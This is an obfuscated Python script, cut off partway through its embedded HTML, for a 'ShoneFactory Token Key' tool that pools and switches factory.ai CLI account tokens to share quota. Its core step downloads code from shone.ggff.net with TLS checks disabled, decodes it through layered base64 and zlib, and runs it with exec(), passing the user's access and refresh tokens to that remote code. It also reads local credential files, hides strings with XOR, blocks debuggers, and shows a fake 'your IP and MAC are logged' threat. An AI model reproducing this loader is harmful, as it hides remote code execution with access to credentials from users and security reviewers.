#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os,sys,json,base64,platform,webbrowser,urllib.request,urllib.error,ssl,time,hashlib,socket,uuid,zlib
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer,BaseHTTPRequestHandler
from urllib.parse import parse_qs,urlparse
import threading,re

# 核心函数占位符 - 运行时从云端加载
def decode_sf_key(s):return"",""
def is_sf_key(s):return False

# 云端同步配置
_CLOUD_URL='https://shone.ggff.net'
_CLIENT_KEY='shonefactory_client_2024'

def _0xGCF():
    """从云端获取客户端配置"""
    try:
        ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
        ts=str(int(time.time()))
        rq=urllib.request.Request(f"{_CLOUD_URL}/api/config",headers={
            'User-Agent':'ShoneFactory-Client/1.0',
            'Accept':'application/json',
            'X-Client-Key':_CLIENT_KEY,
            'X-Timestamp':ts
        },method='GET')
        with urllib.request.urlopen(rq,timeout=10,context=ctx)as rs:
            r=json.loads(rs.read().decode('utf-8'))
            if r.get('success'):
                return r.get('config',{})
    except:pass
    return None

def _0xGVR():
    """从云端获取版本信息"""
    try:
        ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
        rq=urllib.request.Request(f"{_CLOUD_URL}/api/version",headers={
            'User-Agent':'ShoneFactory-Client/1.0',
            'Accept':'application/json'
        },method='GET')
        with urllib.request.urlopen(rq,timeout=10,context=ctx)as rs:
            r=json.loads(rs.read().decode('utf-8'))
            return r
    except:pass
    return {"success":False}

def _0xRRF(sfkey_id):
    """向云端提交刷新请求"""
    if not sfkey_id:
        return {"success":False,"message":"缺少 Key ID"}
    try:
        ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
        ts=str(int(time.time()))
        data=json.dumps({"sfkey_id":sfkey_id[:35]}).encode('utf-8')
        rq=urllib.request.Request(f"{_CLOUD_URL}/api/refresh-request",data=data,headers={
            'User-Agent':'ShoneFactory-Client/1.0',
            'Accept':'application/json',
            'Content-Type':'application/json',
            'X-Client-Key':_CLIENT_KEY,
            'X-Timestamp':ts
        },method='POST')
        with urllib.request.urlopen(rq,timeout=10,context=ctx)as rs:
            r=json.loads(rs.read().decode('utf-8'))
            return r
    except Exception as e:
        return {"success":False,"message":f"提交失败: {str(e)}"}

def _0xGBA(sfkey_id):
    """从云端获取额度信息"""
    try:
        ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
        ts=str(int(time.time()))
        qid=sfkey_id.strip()[:35]
        rq=urllib.request.Request(f"{_CLOUD_URL}/api/balance/{qid}",headers={
            'User-Agent':'ShoneFactory-Client/1.0',
            'Accept':'application/json',
            'X-Client-Key':_CLIENT_KEY,
            'X-Timestamp':ts
        },method='GET')
        with urllib.request.urlopen(rq,timeout=10,context=ctx)as rs:
            r=json.loads(rs.read().decode('utf-8'))
            if r.get('success')and r.get('balance'):
                return r.get('balance')
    except:pass
    return None

def _0xCQ(sfkey_id):
    """从云端查询Token - 支持SF-Key前35字符查询"""
    try:
        ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
        qid=sfkey_id.strip()
        if not qid.startswith('SF-')and len(qid)>=32:qid='SF-'+qid
        url=f"{_CLOUD_URL}/api/query/{qid}"
        ts=str(int(time.time()))
        rq=urllib.request.Request(url,headers={
            'User-Agent':'ShoneFactory-Client/1.0',
            'Accept':'application/json',
            'X-Client-Key':_CLIENT_KEY,
            'X-Timestamp':ts
        },method='GET')
        with urllib.request.urlopen(rq,timeout=15,context=ctx)as rs:
            r=json.loads(rs.read().decode('utf-8'))
            # 即使过期也返回数据（额度用完前仍可使用）
            if r.get('success')and r.get('found')and r.get('data'):
                enc=r.get('data','')
                if enc:
                    b64=enc.replace('_','=').replace('-','+').replace('.','/')
                    b64=b64[::-1]
                    js=base64.b64decode(b64).decode('utf-8')
                    return json.loads(js)
    except:pass
    return None

_0xT=time.time()
_0xCORE=None

def _0xAD1():
    import sys as _s
    if hasattr(_s,'gettrace') and _s.gettrace():return True
    try:
        import ctypes as _c
        if platform.system()=='Windows':
            if _c.windll.kernel32.IsDebuggerPresent():return True
    except:pass
    return False

def _0xAD2():
    _d=['ida64.exe','ida32.exe','ollydbg','x64dbg.exe','x32dbg.exe','windbg','immunity debugger','ghidra','radare2','hopper disassembler','frida-server','cycript','substrate','xposed']
    try:
        import subprocess
        if platform.system()=='Darwin':
            _r=subprocess.run(['ps','aux'],capture_output=True,text=True,timeout=2)
        elif platform.system()=='Windows':
            _r=subprocess.run(['tasklist'],capture_output=True,text=True,timeout=2)
        else:
            _r=subprocess.run(['ps','-e'],capture_output=True,text=True,timeout=2)
        _o=_r.stdout.lower()
        for _t in _d:
            if _t.lower()in _o:return True
    except:pass
    return False

def _0xAD3():
    global _0xT
    _c=time.time();_d=_c-_0xT;_0xT=_c
    if _d>60:return True
    return False

def _0xWARN():
    _ip="UNKNOWN";_mac="UNKNOWN";_vpn=False
    try:
        _s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);_s.connect(("8.8.8.8",80));_ip=_s.getsockname()[0];_s.close()
    except:pass
    try:_mac=':'.join(['{:02x}'.format((uuid.getnode()>>i)&0xff)for i in range(0,48,8)][::-1])
    except:pass
    _msg=f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    ⚠️  严重安全警告 / CRITICAL SECURITY WARNING ⚠️              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║   检测到非法逆向工程/破解行为！                                                    ║
║   您的设备信息已被记录 / Your device information has been logged:                 ║
║   • IP 地址: {_ip:<20}                                                    ║
║   • MAC 地址: {_mac:<20}                                                  ║
║   • 时间戳: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<20}                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
    print(_msg)

def _0xCHK():
    if _0xAD1()or _0xAD2():_0xWARN();os._exit(1)
    if _0xAD3():_0xWARN();os._exit(1)

def _0xLC():
    """动态加载核心代码 - 从云端获取，不落盘"""
    global _0xCORE
    if _0xCORE is not None:
        return _0xCORE
    ctx=ssl.create_default_context()
    ctx.check_hostname=False
    ctx.verify_mode=ssl.CERT_NONE
    ts=str(int(time.time()))
    try:
        rq=urllib.request.Request(f"{_CLOUD_URL}/api/core",headers={
            'User-Agent':'ShoneFactory-Client/1.0',
            'Accept':'application/json',
            'X-Client-Key':_CLIENT_KEY,
            'X-Timestamp':ts
        },method='GET')
        with urllib.request.urlopen(rq,timeout=10,context=ctx)as rs:
            r=json.loads(rs.read().decode('utf-8'))
            if r.get('success')and r.get('core'):
                enc=r.get('core','')
                # 三层解密：Base64 → Base64 → zlib
                try:
                    layer1=base64.b64decode(enc).decode('utf-8')
                    layer2=base64.b64decode(layer1)
                    code=zlib.decompress(layer2).decode('utf-8')
                    # 不保存到 _0xCORE，每次重新获取（安全考虑）
                    return code
                except:pass
    except:pass
    return None

_0xCHK()

_0k=lambda s,k=0x5F:''.join(chr(ord(c)^k)for c in s)
_0e=lambda s:base64.b64encode(s.encode()).decode()
_0d=lambda s:base64.b64decode(s).decode()
_S1=_0k('\x3e\x2e\x35\x3b\x71\x3f\x28\x38\x39')
_S2=_0k('\x3e\x30\x30\x3a\x28\x28\x70\x35\x38\x3c\x3a\x39')
_S3=_0k('\x27\x3a\x3b\x27\x3a\x28\x3b\x70\x35\x38\x3c\x3a\x39')
_S4=_0k('\x71\x3b\x3e\x30\x35\x38\x27\x2c')
_S5=_0k('\x14\x28\x3a\x27\x11\x27\x38\x3b\x3c\x3f\x3a')
_S6=_0d('aHR0cHM6Ly9hcHAuZmFjdG9yeS5haS9hcGkvb3JnYW5pemF0aW9uL21lbWJlcnMvY2hhdC11c2FnZQ==')
_S7=_0d('aHR0cHM6Ly9hcGkuZmFjdG9yeS5haS9jbGkvYXV0aC9yZWZyZXNo')
_S8=_0d('aHR0cHM6Ly9hcGkuZmFjdG9yeS5haS9hdXRoL3JlZnJlc2g=')

_P0=8765
_H0='127.0.0.1'

def _0xF1():return 0
def _0xF2(_a,_b):return _a if _a else _b
def _0xF3(_x):return hashlib.md5(str(_x).encode()).hexdigest()[:8]

class _0xTM:
    def __init__(s):
        _0xCHK()
        s._0pf=Path(__file__).parent/'token_pool.json';s._0mk=0;s._0bc={};s._0lmk();s._cw=None

    def _0lmk(s):
        po=s._0xlp()
        for a in po['accounts']:
            ki=a.get('key_id','')
            if ki.startswith('shonetokenkey'):
                try:
                    n=int(ki[13:])
                    if n>s._0mk:s._0mk=n
                except:pass

    def _0xfp(s):
        _0xCHK()
        if platform.system()=='Windows':return Path(os.environ.get(_S5,''))/_S4[1:]
        return Path.home()/_S4

    def _0xdj(s,t):
        try:
            p=t.strip().split('.')
            if len(p)!=3:return None
            pl=p[1];pd=4-len(pl)%4
            if pd!=4:pl+='='*pd
            return json.loads(base64.urlsafe_b64decode(pl))
        except:return None

    def _0xlp(s):
        if s._0pf.exists():
            with open(s._0pf,'r',encoding='utf-8')as f:return json.load(f)
        return{"accounts":[]}

    def _0xsp(s,po):
        with open(s._0pf,'w',encoding='utf-8')as f:json.dump(po,f,indent=2,ensure_ascii=False)

    def _0xgct(s):
        try:
            af=s._0xfp()/_S1
            if not af.exists():return None
            with open(af,'r',encoding='utf-8')as f:ad=json.load(f)
            return ad.get(_S2,None)
        except:return None

    def _0xgcad(s):
        try:
            af=s._0xfp()/_S1
            if not af.exists():return None
            with open(af,'r',encoding='utf-8')as f:return json.load(f)
        except:return None

    def _0xscl(s):
        ad=s._0xgcad()
        if not ad:return{"synced":False,"message":"未检测到登录账号"}
        at=ad.get(_S2,'');rt=ad.get(_S3,'')
        if not at or not rt:return{"synced":False,"message":"登录信息不完整"}
        pl=s._0xdj(at)
        if not pl:return{"synced":False,"message":"Token 格式无效"}
        po=s._0xlp()
        for a in po['accounts']:
            if a[_S2]==at:return{"synced":False,"message":"账号已在池中","exists":True}
        ki=s._0xgki();ex=pl.get('exp',0);em=pl.get('email','');sb=pl.get('sub','')
        rm=em if em else(f"用户: {sb[:8]}..."if sb else"自动导入")
        ac={"key_id":ki,_S2:at,_S3:rt,"remark":rm,"added_at":datetime.now().strftime('%Y-%m-%d %H:%M:%S'),"exp":ex}
        po['accounts'].append(ac);s._0xsp(po)
        return{"synced":True,"message":f"已自动导入当前登录账号: {ki}","key_id":ki}

    def _0xgcli(s):
        ad=s._0xgcad()
        if not ad:return None
        at=ad.get(_S2,'')
        if not at:return None
        pl=s._0xdj(at)
        if not pl:return None
        ex=pl.get('exp',0);nw=datetime.now().timestamp();sb=pl.get('sub','')
        po=s._0xlp();sfk='';in_pool=False
        # 先通过 access_token 匹配，再通过 sub (用户ID) 匹配
        for a in po['accounts']:
            a_at=a.get(_S2,'');a_pl=s._0xdj(a_at)
            if a_at==at or (a_pl and a_pl.get('sub')==sb):
                sfk=a.get('sf_key_line1','')or a.get('key_id','')
                in_pool=True
                break
        return{"email":pl.get('email',''),"sub":sb,"exp":ex,"expired":ex<=nw,"in_pool":in_pool,"sf_key_line1":sfk}

    def _0xitp(s,at):
        po=s._0xlp()
        for a in po['accounts']:
            if a[_S2]==at:return True
        return False

    def _0xgki(s):s._0mk+=1;return f"shonetokenkey{s._0mk:03d}"

    def _0xpt(s,ct):
        at,rt,sfk='','',''
        ct=ct.strip()
        # 检查是否为短Key（查询码）- 单行35字符以SF-开头
        if ct.startswith('SF-')and len(ct)==35 and '\n'not in ct:
            cd=_0xCQ(ct)
            if cd:return cd.get('access_token',''),cd.get('refresh_token',''),ct
            return'','',''
        # 从云端加载核心解码函数
        code=_0xLC()
        if code:
            try:
                local_vars={}
                exec(code,local_vars)
                _isf=local_vars.get('_isf')
                _dsf=local_vars.get('_dsf')
                if _isf and _isf(ct):
                    at,rt=_dsf(ct)
                    if at and rt:
                        ls=[l.strip()for l in ct.split('\n')if l.strip().startswith('SF-')]
                        sfk=ls[0]if ls else''
                        return at,rt,sfk
            except:pass
        try:
            if '{'in ct and '}'in ct:
                st,ed=ct.find('{'),ct.rfind('}')+1;d=json.loads(ct[st:ed]);at=d.get(_S2,'');rt=d.get(_S3,'')
                if at and rt:return at,rt,''
        except:pass
        am=re.search(r'["\']?'+_S2+r'["\']?\s*[:\s]\s*["\']?([^"\'}\s,]+(?:\.[^"\'}\s,]+)*)["\']?',ct)
        rm=re.search(r'["\']?'+_S3+r'["\']?\s*[:\s]\s*["\']?([^"\'}\s,]+)["\']?',ct)
        if am:at=am.group(1)
        if rm:rt=rm.group(1)
        if at and rt:return at,rt,''
        ls=[l.strip()for l in ct.split('\n')if l.strip()]
        if len(ls)>=2 and ls[0].count('.')==2:return ls[0],ls[1],''
        return'','',''

    def _0xwa(s,at,rt):
        """动态加载核心写入函数 - 从云端获取，不落盘"""
        _0xCHK()
        core_success=False
        try:
            code=_0xLC()
            if code:
                local_vars={}
                exec(code,local_vars)
                _wa=local_vars.get('_wa')
                if _wa:
                    fp=s._0xfp()
                    result=_wa(at,rt,fp,_S1)
                    if result:
                        core_success=True
                        return True
        except:pass
        # 备用方案 - 仅当核心模块失败时执行
        if not core_success:
            try:
                fp=s._0xfp();af=fp/_S1;fp.mkdir(parents=True,exist_ok=True)
                if af.exists():
                    bk=fp/(af.name+'.bak')
                    if bk.exists():bk.unlink()
                    import shutil
                    shutil.copy(af,bk)
                ad={_S2:at,_S3:rt}
                with open(af,'w',encoding='utf-8')as f:json.dump(ad,f,indent=2)
                return True
            except:pass
        return core_success

    def _0xat(s,ct):
        _0xCHK()
        at,rt,sfk=s._0xpt(ct)
        if not at or not rt:return{"success":False,"message":"无法识别 Key 格式，请粘贴完整的 SF-Key Token"}
        pl=s._0xdj(at)
        if not pl:return{"success":False,"message":"无效的 Token 格式"}
        po=s._0xlp()
        for a in po['accounts']:
            if a[_S2]==at:return{"success":False,"message":"此 Key 已存在于账号池中"}
        fi=len(po['accounts'])==0
        ki=sfk if sfk else s._0xgki()
        ex=pl.get('exp',0)
        ac={"key_id":ki,_S2:at,_S3:rt,"remark":"","added_at":datetime.now().strftime('%Y-%m-%d %H:%M:%S'),"exp":ex,"sf_key_line1":sfk}
        po['accounts'].append(ac);s._0xsp(po)
        if fi:s._0xwa(at,rt)
        return{"success":True,"message":f"已添加: {ki}","is_first":fi}

    def _0xgal(s):
        po=s._0xlp();nw=datetime.now().timestamp();ct=s._0xgct();al=[]
        for i,a in enumerate(po['accounts'],1):
            ex=a.get('exp',0);ki=a.get('key_id',f'shonetokenkey{i:03d}');ic=a[_S2]==ct
            sfkl1=a.get('sf_key_line1','')
            # 如果 exp 为 0 或已过期但有 refresh_token，显示为"待刷新"而非"过期"
            if ex==0:st='pending';stx='待验证'
            elif ex>nw:st='valid';stx='有效'
            elif a.get(_S3):st='refresh';stx='待刷新'
            else:st='expired';stx='过期'
            bi=s._0bc.get(ki,{});cached=bi.get('cached',False);lu=bi.get('lastUpdated','')
            # 如果本地查询失败且有 sf_key_line1，尝试从云端获取
            if (bi.get('error')or bi.get('totalAllowance')is None)and sfkl1:
                cb=_0xGBA(sfkl1)
                if cb and cb.get('remaining')is not None:
                    bi={'totalAllowance':cb.get('totalAllowance'),'totalUsed':cb.get('totalUsed'),'remaining':cb.get('remaining'),'usedRatio':cb.get('usedRatio'),'lastUpdated':cb.get('lastUpdated',''),'error':None,'estimated':cb.get('estimated',True)}
                    cached=True
            # 如果状态是"待刷新"，额度显示为短横线而不是"查询失败"
            if bi.get('error')and not bi.get('estimated'):
                if st=='refresh':bs='pending';btx='-';rs='-';us='-'
                else:bs='error';btx='查询失败';rs='-';us='-'
            elif bi.get('totalAllowance')is not None:
                re=bi.get('remaining',0);ur=bi.get('usedRatio',0);est=bi.get('estimated',False)
                if re<=0:bs='exhausted';btx='已耗尽'
                elif ur<0.5:bs='good';btx='充足'
                elif ur<0.8:bs='medium';btx='适中'
                else:bs='low';btx='偏低'
                if est:btx+='(预估)';bs='estimated'
                elif cached:btx+='(缓存)'
                rm=re/1000000;rs=f"{rm:.1f}M"+('*'if est else'');us=f"{ur*100:.1f}%"+('*'if est else'')
            else:bs='pending';btx='未查询';rs='-';us='-'
            al.append({"index":i,"key_id":ki,"status":st,"status_text":stx,"remark":a.get('remark',''),"added_at":a.get('added_at','N/A')[:16],"is_current":ic,"balance_status":bs,"balance_text":btx,"remaining":rs,"usage_ratio":us,"cached":cached,"last_updated":lu})
        return al

    def _0xswa(s,ix):
        _0xCHK()
        po=s._0xlp();idx=ix-1
        if idx<0 or idx>=len(po['accounts']):return{"success":False,"message":"账号不存在"}
        a=po['accounts'][idx]
        if s._0xwa(a[_S2],a[_S3]):return{"success":True,"message":f"已切换到: {a['key_id']}"}
        return{"success":False,"message":"切换失败"}

    def _0xda(s,ix):
        po=s._0xlp();idx=ix-1
        if idx<0 or idx>=len(po['accounts']):return{"success":False,"message":"账号不存在"}
        ki=po['accounts'][idx]['key_id'];del po['accounts'][idx];s._0xsp(po)
        return{"success":True,"message":f"已删除: {ki}"}

    def _0xur(s,ix,rm):
        po=s._0xlp();idx=ix-1
        if idx<0 or idx>=len(po['accounts']):return{"success":False,"message":"账号不存在"}
        po['accounts'][idx]['remark']=rm;s._0xsp(po)
        return{"success":True,"message":"备注已更新"}

    def _0xrsa(s,ix):
        """刷新单个账号的额度"""
        po=s._0xlp();idx=ix-1
        if idx<0 or idx>=len(po['accounts']):return{"success":False,"message":"账号不存在"}
        a=po['accounts'][idx];ki=a.get('key_id','');at=a.get(_S2,'');ex=a.get('exp',0);nw=datetime.now().timestamp()
        # 如果 Token 过期，先尝试刷新 Token
        if ex<=nw and a.get(_S3):
            rr=s._0xrta_internal(idx)
            if rr.get('success'):
                po=s._0xlp();at=po['accounts'][idx].get(_S2,'')
        # 查询额度
        if at:
            sc=s._0xfb(at,ki)
            if sc:return{"success":True,"message":f"额度刷新成功: {ki}"}
        return{"success":False,"message":"额度刷新失败，请稍后重试"}

    def _0xrta_internal(s,idx):
        """内部方法：刷新 Token"""
        po=s._0xlp()
        if idx<0 or idx>=len(po['accounts']):return{"success":False}
        a=po['accounts'][idx];rt=a.get(_S3,'')
        if not rt:return{"success":False}
        urls=[_S7,_S8]
        for u in urls:
            try:
                d=json.dumps({_S3:rt}).encode('utf-8');rq=urllib.request.Request(u,data=d,headers={'Content-Type':'application/json','Accept':'application/json'},method='POST')
                with urllib.request.urlopen(rq,timeout=8)as rs:
                    r=json.loads(rs.read().decode('utf-8'))
                    if _S2 in r:
                        po['accounts'][idx][_S2]=r[_S2]
                        if _S3 in r:po['accounts'][idx][_S3]=r[_S3]
                        pl=s._0xdj(r[_S2])
                        if pl:po['accounts'][idx]['exp']=pl.get('exp',0)
                        s._0xsp(po)
                        return{"success":True}
            except:continue
        return{"success":False}

    def _0xrta(s,ix):
        po=s._0xlp();idx=ix-1
        if idx<0 or idx>=len(po['accounts']):return{"success":False,"message":"账号不存在"}
        a=po['accounts'][idx];rt=a.get(_S3,'')
        if not rt:return{"success":False,"message":"该账号没有 refresh_token"}
        urls=[_S7,_S8]
        for u in urls:
            try:
                d=json.dumps({_S3:rt}).encode('utf-8');rq=urllib.request.Request(u,data=d,headers={'Content-Type':'application/json','Accept':'application/json'},method='POST')
                with urllib.request.urlopen(rq,timeout=8)as rs:
                    r=json.loads(rs.read().decode('utf-8'))
                    if _S2 in r:
                        po['accounts'][idx][_S2]=r[_S2]
                        if _S3 in r:po['accounts'][idx][_S3]=r[_S3]
                        pl=s._0xdj(r[_S2])
                        if pl:po['accounts'][idx]['exp']=pl.get('exp',0)
                        s._0xsp(po)
                        return{"success":True,"message":f"刷新成功: {a['key_id']}"}
            except:continue
        # 刷新失败，尝试从云端获取
        sfkl1=a.get('sf_key_line1','')
        if sfkl1:
            cd=_0xCQ(sfkl1[:35])
            if cd and cd.get('access_token')and cd.get('refresh_token'):
                po['accounts'][idx][_S2]=cd['access_token']
                po['accounts'][idx][_S3]=cd['refresh_token']
                pl=s._0xdj(cd['access_token'])
                if pl:po['accounts'][idx]['exp']=pl.get('exp',0)
                s._0xsp(po)
                return{"success":True,"message":f"已从云端同步: {a['key_id']}"}
        return{"success":False,"message":"刷新失败，建议使用 'droid auth login' 重新登录"}

    def _0xfb(s,at,ki):
        try:
            ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
            rq=urllib.request.Request(_S6,headers={'Authorization':f'Bearer {at}','Accept':'*/*','User-Agent':'Mozilla/5.0'},method='GET')
            with urllib.request.urlopen(rq,timeout=8,context=ctx)as rs:
                d=json.loads(rs.read().decode('utf-8'));us=d.get('usage',{});sd=us.get('standard',{})
                ta=sd.get('totalAllowance',0);tu=sd.get('orgTotalTokensUsed',0);re=max(0,ta-tu);ur=tu/ta if ta>0 else 0
                lu=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                s._0bc[ki]={'totalAllowance':ta,'totalUsed':tu,'remaining':re,'usedRatio':ur,'lastUpdated':lu,'error':None,'cached':False}
                # 保存缓存到 JSON
                s._0sbc(ki,{'totalAllowance':ta,'totalUsed':tu,'remaining':re,'usedRatio':ur,'lastUpdated':lu})
                return True
        except Exception as e:
            # 查询失败，尝试读取缓存
            cb=s._0gbc(ki)
            if cb:
                s._0bc[ki]={'totalAllowance':cb.get('totalAllowance'),'totalUsed':cb.get('totalUsed'),'remaining':cb.get('remaining'),'usedRatio':cb.get('usedRatio'),'lastUpdated':cb.get('lastUpdated','未知'),'error':None,'cached':True}
                return True
            s._0bc[ki]={'totalAllowance':None,'totalUsed':None,'remaining':None,'usedRatio':None,'lastUpdated':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'error':str(e),'cached':False}
            return False

    def _0sbc(s,ki,data):
        """保存缓存到 JSON"""
        try:
            po=s._0xlp()
            for a in po['accounts']:
                if a.get('key_id')==ki:
                    a['cached_balance']=data
                    break
            s._0xsp(po)
        except:pass

    def _0gbc(s,ki):
        """从 JSON 读取缓存"""
        try:
            po=s._0xlp()
            for a in po['accounts']:
                if a.get('key_id')==ki:
                    return a.get('cached_balance')
        except:pass
        return None

    def _0xrab(s):
        po=s._0xlp();rs=[];nw=datetime.now().timestamp()
        for i,a in enumerate(po['accounts']):
            ki=a.get('key_id','');at=a.get(_S2,'');ex=a.get('exp',0)
            # 如果 token 过期，先尝试刷新
            if ex<=nw and a.get(_S3):
                rr=s._0xrta(i+1)
                if rr.get('success'):
                    po=s._0xlp()
                    at=po['accounts'][i].get(_S2,'')
            if at:sc=s._0xfb(at,ki);rs.append({'key_id':ki,'success':sc})
        return rs

    def _0xgbi(s,ki):return s._0bc.get(ki,{})

_H1='''<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShoneFactory Token Key</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, #1e1e2e 0%, #2d2d3a 100%);
            min-height: 100vh;
            color: #f8f8f2;
            padding: 20px;
        }
        .container { max-width: 1200px; width: 95%; margin: 0 auto; }
        h1 { text-align: center; color: #bd93f9; margin-bottom: 30px; font-size: 28px; }
        .card { background: #282a36; border-radius: 12px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3); }
        .card-title { color: #bd93f9; font-size: 16px; font-weight: bold; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid #44475a; }
        textarea { width: 100%; height: 100px; background: #1e1e2e; border: 1px solid #44475a; border-radius: 8px; color: #f8f8f2; padding: 12px; font-family: monospace; font-size: 13px; resize: vertical; }
        textarea:focus { outline: none; border-color: #bd93f9; }
        .hint { color: #6272a4; font-size: 13px; margin-top: 8px; }
        .hint-orange { color: #ffb86c; }
        .btn-row { display: flex; gap: 10px; margin-top: 15px; flex-wrap: wrap; }
        .btn { padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; transition: all 0.2s; }
        .btn:hover { transform: translateY(-1px); }
        .btn-primary { background: #bd93f9; color: #1e1e2e; }
        .btn-primary:hover { background: #caa4ff; }
        .btn-secondary { background: #44475a; color: #f8f8f2; }
        .btn-secondary:hover { background: #565970; }
        .btn-danger { background: #ff5555; color: #fff; }
        .btn-danger:hover { background: #ff6e6e; }
        .btn-success { background: #50fa7b; color: #1e1e2e; }
        .btn-success:hover { background: #6bfb8f; }
        .info-row { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin-top: 15px; }
        .info-row a { color: #8be9fd; text-decoration: none; }
        .info-row a:hover { text-decoration: underline; }
        .info-row span { color: #6272a4; font-size: 13px; }
        .table-wrapper { overflow-x: auto; -webkit-overflow-scrolling: touch; }
        table { width: 100%; border-collapse: collapse; min-width: 900px; }
        th, td { padding: 10px 8px; text-align: left; border-bottom: 1px solid #44475a; white-space: nowrap; }
        th { color: #bd93f9; font-weight: 600; font-size: 13px; }
        td { font-size: 13px; }
        tr:hover { background: #2d2d44; }
        .status-current { color: #50fa7b; }
        .status-valid { color: #8be9fd; }
        .status-expired { color: #ff5555; }
        .status-refresh { color: #f1fa8c; }
        .status-pending { color: #6272a4; }
        .balance-good { color: #50fa7b; }
        .balance-medium { color: #f1fa8c; }
        .balance-low { color: #ffb86c; }
        .balance-exhausted { color: #ff5555; }
        .balance-error { color: #ff5555; }
        .balance-pending { color: #6272a4; }
        .balance-estimated { color: #bd93f9; font-style: italic; }
        .cached-badge { font-size: 10px; color: #ffb86c; margin-left: 4px; }
        .action-btn { padding: 5px 10px; font-size: 12px; margin-right: 5px; }
        .btn-request-refresh { display: block; background: linear-gradient(135deg, #ff79c6, #bd93f9); border: none; color: #fff; padding: 3px 8px; font-size: 10px; border-radius: 4px; cursor: pointer; margin-bottom: 4px; transition: all 0.2s; }
        .btn-request-refresh:hover { background: linear-gradient(135deg, #ff92d0, #caa8ff); transform: scale(1.05); }
        .toast { position: fixed; top: 20px; right: 20px; padding: 15px 25px; border-radius: 8px; color: #fff; font-weight: 500; z-index: 1000; animation: slideIn 0.3s ease; }
        .toast-success { background: #50fa7b; color: #1e1e2e; }
        .toast-error { background: #ff5555; }
        .toast-info { background: #8be9fd; color: #1e1e2e; }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; justify-content: center; align-items: center; }
        .modal.active { display: flex; }
        .modal-content { background: #282a36; padding: 25px; border-radius: 12px; width: 90%; max-width: 400px; }
        .modal-title { color: #bd93f9; margin-bottom: 15px; }
        .modal input, .modal textarea { width: 100%; margin-bottom: 15px; }
        .modal input { background: #1e1e2e; border: 1px solid #44475a; border-radius: 6px; color: #f8f8f2; padding: 10px; }
        .empty-state { text-align: center; padding: 40px; color: #6272a4; }
        .login-status { padding: 15px; border-radius: 8px; background: #1e1e2e; }
        .login-status .status-row { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .login-status .user-info { display: flex; align-items: center; gap: 10px; }
        .login-status .status-badge { padding: 4px 12px; border-radius: 12px; font-size: 12px; font-weight: 500; }
        .login-status .badge-active { background: #50fa7b; color: #1e1e2e; }
        .login-status .badge-expired { background: #ff5555; color: #fff; }
        .login-status .badge-none { background: #6272a4; color: #fff; }
        .login-status .badge-synced { background: #8be9fd; color: #1e1e2e; }
        .toolbar { margin-bottom: 15px; }
        .paste-section { display: flex; gap: 20px; }
        .paste-left { flex: 0 0 auto; display: flex; flex-direction: column; }
        .paste-left textarea { width: 580px; height: 200px; resize: none; }
        .paste-right { flex: 1; display: flex; flex-direction: column; }
        .credits-box { background: #1e1e2e; border: 1px solid #44475a; border-radius: 8px; padding: 15px; height: 100%; min-height: 200px; }
        .credits-title { color: #bd93f9; font-size: 14px; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid #44475a; }
        .credits-item { color: #8be9fd; font-size: 13px; margin-bottom: 8px; }
        .hint-row { display: flex; gap: 20px; margin-top: 8px; }
        .loading { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
        .loading.active { display: flex; }
        .loading-content { background: #282a36; padding: 30px; border-radius: 12px; text-align: center; min-width: 200px; }
        .progress-ring { width: 80px; height: 80px; margin: 0 auto 15px; position: relative; }
        .progress-ring svg { transform: rotate(-90deg); }
        .progress-ring circle { fill: none; stroke-width: 6; }
        .progress-ring .bg { stroke: #44475a; }
        .progress-ring .progress { stroke: #bd93f9; stroke-linecap: round; transition: stroke-dashoffset 0.3s; }
        .progress-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 14px; font-weight: bold; color: #bd93f9; }
        .loading-message { color: #f8f8f2; font-size: 14px; margin-top: 10px; }
        .spinner { border: 4px solid #44475a; border-top: 4px solid #bd93f9; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>ShoneFactory Token Key</h1>
        <div class="card">
            <div class="card-title">粘贴 Key</div>
            <div class="paste-section">
                <div class="paste-left">
                    <textarea id="tokenInput" placeholder="粘贴完整的 SF-Key Token..."></textarea>
                    <div class="hint-row">
                        <p class="hint hint-orange">首次添加满1000万额度</p>
                    </div>
                    <div class="btn-row">
                        <button class="btn btn-secondary" onclick="clearInput()">清空输入</button>
